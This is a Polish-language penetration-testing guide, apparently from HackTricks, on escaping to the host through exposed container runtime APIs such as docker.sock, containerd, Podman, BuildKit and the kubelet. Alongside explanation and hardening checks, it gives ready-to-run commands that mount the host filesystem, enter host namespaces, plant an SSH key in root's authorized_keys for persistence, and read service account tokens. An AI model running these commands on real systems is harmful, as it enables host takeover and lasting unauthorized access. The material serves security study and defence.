# Ekspozycja Runtime API i daemona

{{#include ../../../banners/hacktricks-training.md}}

## Wprowadzenie

Wiele rzeczywistych kompromitacji kontenerów wcale nie zaczyna się od ucieczki z namespace. Zaczynają się od uzyskania dostępu do control plane runtime. Jeśli workload może komunikować się z `dockerd`, `containerd`, CRI-O, Podmanem lub kubeletem przez zamontowany Unix socket albo exposed TCP listener, attacker może być w stanie zażądać utworzenia nowego kontenera z większymi uprawnieniami, zamontować filesystem hosta, dołączyć do host namespaces lub pobrać poufne informacje o node. W takich przypadkach runtime API jest rzeczywistą granicą bezpieczeństwa, a jego compromise jest funkcjonalnie zbliżony do kompromitacji hosta.

Dlatego ekspozycję runtime socket należy dokumentować oddzielnie od zabezpieczeń kernela. Kontener ze standardowym seccomp, capabilities i MAC confinement nadal może być o jedno wywołanie API od kompromitacji hosta, jeśli `/var/run/docker.sock` lub `/run/containerd/containerd.sock` jest w nim zamontowany. Kernel isolation bieżącego kontenera może działać dokładnie zgodnie z założeniami, podczas gdy management plane runtime pozostaje całkowicie exposed.

## Modele dostępu do daemona

Docker Engine tradycyjnie udostępnia swoje uprzywilejowane API przez lokalny Unix socket `unix:///var/run/docker.sock`. Historycznie był również udostępniany zdalnie przez TCP listenery, takie jak `tcp://0.0.0.0:2375`, lub listener chroniony przez TLS na porcie `2376`. Zdalne udostępnienie daemona bez silnego TLS i uwierzytelniania clienta skutecznie zmienia Docker API w zdalny interfejs root.

containerd, CRI-O, Podman i kubelet udostępniają podobne, high-impact surfaces. Nazwy i workflows się różnią, ale logika pozostaje taka sama. Jeśli interfejs pozwala callerowi tworzyć workloady, montować ścieżki hosta, pobierać credentials lub modyfikować działające kontenery, jest on uprzywilejowanym kanałem zarządzania i należy go odpowiednio traktować.

Typowe lokalne ścieżki, które warto sprawdzić, to:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Starsze lub bardziej wyspecjalizowane stacks mogą również udostępniać endpointy takie jak `dockershim.sock`, `frakti.sock` lub `rktlet.sock`. Są one mniej powszechne we współczesnych środowiskach, ale gdy się z nimi zetkniesz, należy traktować je z taką samą ostrożnością, ponieważ reprezentują powierzchnie kontroli runtime, a nie zwykłe sockety aplikacji.

## Bezpieczny zdalny dostęp

Jeśli daemon musi być udostępniony poza lokalnym socketem, połączenie powinno być chronione za pomocą TLS, a najlepiej także wzajemnego uwierzytelniania, aby daemon weryfikował klienta, a klient weryfikował daemon. Stary zwyczaj otwierania daemona Docker przez zwykły HTTP dla wygody jest jednym z najniebezpieczniejszych błędów w administracji kontenerami, ponieważ powierzchnia API jest wystarczająco rozbudowana, aby bezpośrednio tworzyć uprzywilejowane kontenery.

Historyczny wzorzec konfiguracji Docker wyglądał następująco:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Na hostach opartych na systemd komunikacja z daemonem może również występować jako `fd://`, co oznacza, że proces dziedziczy wcześniej otwarty socket z systemd, zamiast samodzielnie go nasłuchiwać. Najważniejszy wniosek nie dotyczy dokładnej składni, lecz konsekwencji dla bezpieczeństwa. W momencie, gdy daemon nasłuchuje poza lokalnym socketem z rygorystycznie ustawionymi uprawnieniami, bezpieczeństwo transportu i uwierzytelnianie klienta stają się obowiązkowe, a nie opcjonalnym hardeningiem.

## Nadużycie

Jeśli obecny jest socket runtime, sprawdź, który to socket, czy istnieje kompatybilny klient oraz czy możliwy jest bezpośredni dostęp przez HTTP lub gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Te polecenia są przydatne, ponieważ pozwalają odróżnić niedziałającą ścieżkę, zamontowany, ale niedostępny socket oraz działające uprzywilejowane API. Jeśli client zakończy działanie powodzeniem, kolejne pytanie brzmi: czy API może uruchomić nowy kontener z host bind mount lub współdzieleniem przestrzeni nazw hosta?

### Gdy nie zainstalowano żadnego clienta

Brak `docker`, `podman` lub innego przyjaznego CLI nie oznacza, że socket jest bezpieczny. Docker Engine używa HTTP przez swój Unix socket, a Podman udostępnia zarówno API zgodne z Dockerem, jak i natywne API Libpod za pośrednictwem `podman system service`. Oznacza to, że minimalne środowisko zawierające wyłącznie `curl` może nadal wystarczyć do sterowania daemonem:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Ma to znaczenie podczas post-exploitation, ponieważ obrońcy czasami usuwają standardowe client binaries, ale pozostawiają zamontowany management socket. Na hostach Podman pamiętaj, że ścieżka o wysokiej wartości różni się w zależności od wdrożenia rootful i rootless: `unix:///run/podman/podman.sock` dla instancji usług rootful oraz `unix://$XDG_RUNTIME_DIR/podman/podman.sock` dla instancji rootless.

### Pełny przykład: Docker Socket To Host Root

Jeśli `docker.sock` jest dostępny, klasyczny escape polega na uruchomieniu nowego kontenera, który montuje główny system plików hosta, a następnie wykonaniu w nim `chroot`:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Zapewnia to bezpośrednie wykonywanie poleceń z uprawnieniami host-root za pośrednictwem Docker daemon. Skutki nie ograniczają się do odczytu plików. Po wejściu do nowego kontenera attacker może modyfikować pliki hosta, pozyskiwać credentials, instalować persistence lub uruchamiać dodatkowe uprzywilejowane workloady.

### Pełny przykład: Docker Socket Do Host Namespaces

Jeśli attacker woli wejście do namespace zamiast dostępu ograniczonego wyłącznie do systemu plików:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Ta ścieżka dociera do hosta, prosząc runtime o utworzenie nowego kontenera z jawną ekspozycją host-namespace, zamiast wykorzystywać obecny kontener.

### Wzorzec utrzymania dostępu przez Docker Socket

Kontrola nad runtime może być również wykorzystywana do utrzymania dostępu zamiast jednorazowego shell. Ogólny wzorzec polega na utworzeniu kontenera pomocniczego z host mount, zapisaniu materiałów autoryzowanego dostępu lub startup hook do zamontowanego systemu plików hosta, a następnie sprawdzeniu, czy host je wykorzystuje.

Przykładowy schemat:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Ta sama idea może dotyczyć jednostek systemd, fragmentów cron, plików startowych aplikacji lub kluczy SSH, zależnie od tego, co operator chce udowodnić. Istotne jest to, że trwała zmiana jest wprowadzana za pośrednictwem uprawnień daemona runtime do systemu plików hosta, a nie poprzez dodatkowe uprawnienia w pierwotnym kontenerze.

### Raw Docker API Helper Pivot

Gdy brakuje Docker CLI, ten sam przepływ z helperem i host-mountem można obsłużyć przez HTTP za pośrednictwem Unix socketu. Ogólny przepływ wygląda następująco: potwierdź API, utwórz kontener helpera z host bind mountem, uruchom go, utwórz instancję exec i uruchom ten exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Końcowe żądanie `/exec/<id>/start` zależy od zwróconego identyfikatora exec, ale kwestia bezpieczeństwa jest niezależna od dokładnego sposobu obsługi JSON: surowy dostęp do API rootful Docker daemon wystarcza, aby zażądać silniejszego pomocniczego workloadu.

### Pełny przykład: socket containerd

Zamontowany socket `containerd` jest zazwyczaj równie niebezpieczny:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Jeśli dostępny jest klient bardziej zbliżony do Dockera, `nerdctl` może być wygodniejszy niż `ctr`, ponieważ udostępnia znane flagi, takie jak `--privileged`, `--pid=host` i `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Skutkiem jest ponownie kompromitacja hosta. Nawet jeśli brakuje narzędzi specyficznych dla Dockera, inny runtime API może nadal oferować te same uprawnienia administracyjne. Na węzłach Kubernetes `crictl` może również wystarczyć do rekonesansu i interakcji z kontenerami, ponieważ komunikuje się bezpośrednio z endpointem CRI.

### Gniazdo BuildKit

`buildkitd` łatwo przeoczyć, ponieważ często uważa się go za „tylko backend kompilacji”, ale daemon nadal jest uprzywilejowaną płaszczyzną sterowania. Dostępny `buildkitd.sock` może pozwolić atakującemu na uruchamianie dowolnych kroków build, sprawdzanie możliwości workera, używanie lokalnych contextów ze skompromitowanego środowiska oraz żądanie niebezpiecznych entitlements, takich jak `network.host` lub `security.insecure`, jeśli daemon został skonfigurowany tak, aby na nie zezwalać.

Przydatne pierwsze interakcje to:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Jeśli daemon akceptuje żądania build, sprawdź, czy dostępne są niebezpieczne entitlements:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Dokładny wpływ zależy od konfiguracji daemona, ale usługa BuildKit działająca jako root z liberalnymi uprawnieniami nie jest nieszkodliwym udogodnieniem dla developerów. Traktuj ją jako kolejną cenną powierzchnię administracyjną, szczególnie na CI runners i współdzielonych węzłach kompilacji.

### Kubelet API przez TCP

kubelet nie jest container runtime, ale nadal stanowi część płaszczyzny zarządzania węzłem i często pojawia się w dyskusjach dotyczących tej samej granicy zaufania. Jeśli secure port kubeleta `10250` jest osiągalny z workloadu albo ujawnione zostaną dane uwierzytelniające węzła, kubeconfigi lub uprawnienia proxy, attacker może być w stanie wyliczyć Pods, pobrać logi lub wykonywać komendy w kontenerach lokalnych dla węzła, nigdy nie dotykając ścieżki admission serwera Kubernetes API.

Zacznij od szybkiego rozpoznania:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Jeśli ścieżka proxy kubeletu lub API-server autoryzuje `exec`, klient obsługujący WebSocket może wykorzystać to do uzyskania code execution w innych kontenerach na node. Z tego samego powodu `nodes/proxy` z uprawnieniem tylko `get` jest bardziej niebezpieczne, niż mogłoby się wydawać: żądanie nadal może dotrzeć do endpointów kubeletu, które wykonują polecenia, a te bezpośrednie interakcje z kubeletem nie pojawiają się w standardowych logach audytu Kubernetes.<sup>[[2]](#references)</sup>

## Kontrole

Celem tych kontroli jest ustalenie, czy kontener może uzyskać dostęp do dowolnej płaszczyzny zarządzania, która powinna pozostać poza granicą zaufania.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Co jest tutaj interesujące:

- Zamontowany runtime socket jest zwykle bezpośrednią możliwością administracyjną, a nie jedynie ujawnieniem informacji.
- Listener TCP na `2375` bez TLS należy traktować jako warunek umożliwiający zdalne przejęcie.
- Zmienne środowiskowe, takie jak `DOCKER_HOST`, często ujawniają, że workload został celowo zaprojektowany do komunikacji z runtime hosta.

## Domyślne ustawienia runtime

| Runtime / platforma | Stan domyślny | Domyślne działanie | Typowe ręczne osłabienie |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie lokalny Unix socket | `dockerd` nasłuchuje na lokalnym sockecie, a daemon zwykle działa z uprawnieniami root | montowanie `/var/run/docker.sock`, wystawienie `tcp://...:2375`, słaby lub brak TLS na `2376` |
| Podman | Domyślnie CLI bez daemona | Do zwykłego lokalnego użycia nie jest wymagany długotrwale działający uprzywilejowany daemon; API sockets mogą jednak zostać wystawione po włączeniu `podman system service` | wystawienie `podman.sock`, szerokie uruchomienie service, użycie rootful API |
| containerd | Lokalny uprzywilejowany socket | Administrative API jest wystawiane przez lokalny socket i zwykle używane przez narzędzia wyższego poziomu | montowanie `containerd.sock`, szeroki dostęp przez `ctr` lub `nerdctl`, wystawianie uprzywilejowanych namespaces |
| CRI-O | Lokalny uprzywilejowany socket | Endpoint CRI jest przeznaczony dla zaufanych komponentów lokalnych dla node'a | montowanie `crio.sock`, wystawienie endpointu CRI niezaufanym workloadom |
| Kubernetes kubelet | Node-local management API | Kubelet nie powinien być szeroko dostępny z poziomu Pods; dostęp może ujawniać stan podów, credentials i funkcje wykonawcze, zależnie od authn/authz | montowanie socketów lub certyfikatów kubeleta, słabe uwierzytelnianie kubeleta, host networking wraz z dostępnym endpointem kubeleta |

## References

- [1] [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)

{{#include ../../../banners/hacktricks-training.md}}
